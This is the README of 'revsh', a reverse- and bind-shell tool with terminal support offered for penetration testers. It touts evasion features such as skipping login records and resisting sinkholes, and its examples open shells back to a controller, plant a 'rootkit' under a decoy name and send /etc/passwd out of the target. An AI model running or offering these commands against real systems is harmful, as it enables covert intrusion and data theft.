# revsh #

_revsh_ is a tool for establishing a [reverse shell](http://en.wikipedia.org/wiki/Reverse_shell) with [terminal](http://en.wikipedia.org/wiki/Computer_terminal) support.

**What is a "reverse shell"?**

A reverse shell is a network connection that grants [shell](http://en.wikipedia.org/wiki/Shell_%28computing%29) access to a remote host. As opposed to other remote login tools such as [telnet](http://en.wikipedia.org/wiki/Telnet) and [ssh](http://en.wikipedia.org/wiki/Secure_Shell), a reverse shell is initiated by the remote host. This technique of connecting outbound from the remote network allows for circumvention of firewalls that are configured to block inbound connections only. 

**What is a "bind shell"?**

A [bind shell](http://en.wikipedia.org/wiki/Shellcode#Remote) is a shell that is served from a normal forward network connection. _revsh_ supports both reverse and bind shells. To invoke a bind shell, either call _revsh_ with the _-b_ flag on both ends of the connection, or call the binary as 'bindsh'.


**Can't I just use [netcat](http://en.wikipedia.org/wiki/Netcat)?**

There are [many techniques](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) for establishing a reverse shell, but these methods don't provide terminal support. _revsh_ allows for a reverse shell whose connection is mediated by a [pseudo-terminal](http://en.wikipedia.org/wiki/Pseudoterminal), and thus allows for features such as:

 * [job control](http://en.wikipedia.org/wiki/Job_control)
 * [control character processing](http://en.wikipedia.org/wiki/Control_character) (e.g [Ctrl-C](http://en.wikipedia.org/wiki/Control-C))
 * [auto-completion](http://en.wikipedia.org/wiki/Auto-completion)
 * support for programs requiring a [controlling tty](https://github.com/emptymonkey/ctty) (e.g. [sudo](http://en.wikipedia.org/wiki/Sudo))
 * [processing of window re-size events](http://linux.die.net/man/4/tty_ioctl)

In addition, _revsh_ also offers the following features:
 * [UTF-8](http://en.wikipedia.org/wiki/UTF-8) support.
 * Circumvents [utmp / wtmp](http://en.wikipedia.org/wiki/Utmp). (No login recorded.)
 * Processes [rc file](http://en.wikipedia.org/wiki/Run_commands) commands upon login for easy scripting.
 * [OpenSSL](https://www.openssl.org/) encryption with key based authentication baked into the binary.
 * Anonymous [Diffie-Hellman](http://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange) encryption upon request.
 * Ephemeral Diffie-Hellman encryption as default. (Now with more [Perfect Forward Secrecy](http://en.wikipedia.org/wiki/Forward_secrecy)!)
 * [Cert pinning](http://en.wikipedia.org/wiki/Transport_Layer_Security#Certificate_pinning) for protection against [sinkholes](http://en.wikipedia.org/wiki/DNS_sinkhole) and [mitm](http://en.wikipedia.org/wiki/Man-in-the-middle_attack) counter-intrusion.
 * Connection timeout for remote process self-termination.
 * Randomized retry timers for non-predictable auto-reconnection.
 * Netcat style non-interactive data brokering for file transfer.

_revsh_ is intended as a supplementary tool for a [pentester's](http://en.wikipedia.org/wiki/Pentester) toolkit that provides the full set of terminal features across an encrypted tunnel. All together in a small (~50k) easy to use binary.

**Where can I use _revsh_?**

_revsh_ was developed on x86_64 Linux. Here is a brief list of Arch / OS combinations that it has been used on:
 * x86_64 Linux
 * i686 Linux
 * amd64 FreeBSD

(If you have successfully used revsh on another platform, drop me a line and I'll add it to the list.)

## Usage ##

	empty@monkey:~$ revsh -h
	
	usage:    revsh [-c [-a] [-d KEYS_DIR] [-f RC_FILE]] [-s SHELL] [-t SEC] [-r SEC1[,SEC2]] [-b [-k]] [-n] [-v] [ADDRESS:PORT]

	  -c              Run in command and control mode.                 (Default is target mode.)
	  -a              Enable Anonymous Diffie-Hellman mode.            (Default is "!ADH:DHE-RSA-AES256-SHA".)
	  -d KEYS_DIR     Reference the keys in an alternate directory.    (Default is "~/.revsh/keys/".)
	  -f RC_FILE      Reference an alternate rc file.                  (Default is "~/.revsh/rc".)
	  -s SHELL        Invoke SHELL as the remote shell.                (Default is "/bin/bash".)
	  -t SEC          Set the connection timeout to SEC seconds.       (Default is "3600".)
	  -r SEC1,SEC2    Set the retry time to be SEC1 seconds, or        (Default is "600,1200".)
	                  to be random in the range from SEC1 to SEC2.
	  -b              Start in bind shell mode.                        (Default is reverse shell mode.)
	  -k              Start the bind shell in keep-alive mode.         (Ignored in reverse shell mode.)
	  -n              Non-interactive netcat style data broker.        (Default is interactive w/remote tty.)
	                  No tty. Useful for copying files.
	  -v              Verbose output.
	  -h              Print this help.
	  ADDRESS:PORT    The address and port of the listening socket.    (Default is "127.0.0.1:9999".)

	  Notes:
	      * The -b flag must be invoked on both the control and target hosts to enable bind shell mode.
	      * Bind shell mode can also be enabled by invoking the binary as 'bindsh' instead of 'revsh'.
	      * Verbose output may mix with data if -v is used together with -n.

	  Interactive example:
	      local controller host:    revsh -c 192.168.0.42:443
	      remote target host:       revsh 192.168.0.42:443

	  Non-interactive example:
	      local controller host:    cat ~/bin/rootkit | revsh -n -c 192.168.0.42:443
	      remote target host:       revsh 192.168.0.42:443 > ./totally_not_a_rootkit


## Example ##

First, setup the local host to be the command and control host (e.g. "monkey"):

	empty@monkey:~$ revsh -c 192.168.0.42:9999

Then connect out from the remote target host (e.g. "kitty"):

	target@kitty:~$ ./revsh 192.168.0.42:9999

We will now find a shell waiting for us back at the control host:

	Listening on 192.168.0.42:9999...  Connected!
	 Remote fingerprint expected: 09a348e737b96961d7ff9d55f958e771828f839e
	 Remote fingerprint received: 09a348e737b96961d7ff9d55f958e771828f839e
	Initializing... Done!
	
	################################
	# hostname: kitty
	# ip address: 192.168.0.123
	# real user: target
	# effective user: target
	################################
	target@kitty:/$ ls -l /etc/passwd
	-rw-r--r-- 1 root root 1538 Jul 18 22:50 /etc/passwd
	target@kitty:/$

Note, if you configured the binary at build time to change the IP:PORT address to 192.168.0.42:9999, then the above example becomes even cleaner:

	empty@monkey:~$ revsh -c
	target@kitty:~$ ./revsh

For a covert reverse shell, _revsh_ can be invoked from within [_mimic_](https://github.com/emptymonkey/mimic) on the target host:

	empty@monkey:~$ revsh -c
	target@kitty:~$ /tmp/mimic -e '/tmp/revsh -s "/tmp/mimic -e /bin/bash"'

For netcat style data transfer (with all of the crypto benefits of _revsh_) invoke _revsh_ with the -n switch. This is useful for moving tools on to the target host:

	empty@monkey:~$ cat rootkit.tar | ./revsh -c -n
	target@kitty:~$ ./revsh >./totally_not_a_rootkit.tar
	

Or for moving data out from the target host:

	empty@monkey:~$ revsh -c
	target@kitty:~$ cat /etc/passwd | ./revsh -n


## Installation ##

	git clone https://github.com/emptymonkey/revsh.git
	cd revsh
	vi config.h        # Set up new defaults that fit your situation.
	make               # This *can* take a very long time, though it usually doesn't.
	make install
	cd ~/.revsh
	vi rc              # Add your favorite startup commands to really customize the feel of your remote shell.
	./revsh -h

## A Quick Note on Ethics ##

I write and release these tools with the intention of educating the larger [IT](http://en.wikipedia.org/wiki/Information_technology) community and empowering legitimate pentesters. If I can write these tools in my spare time, then rest assured that the dedicated malicious actors have already developed versions of their own.

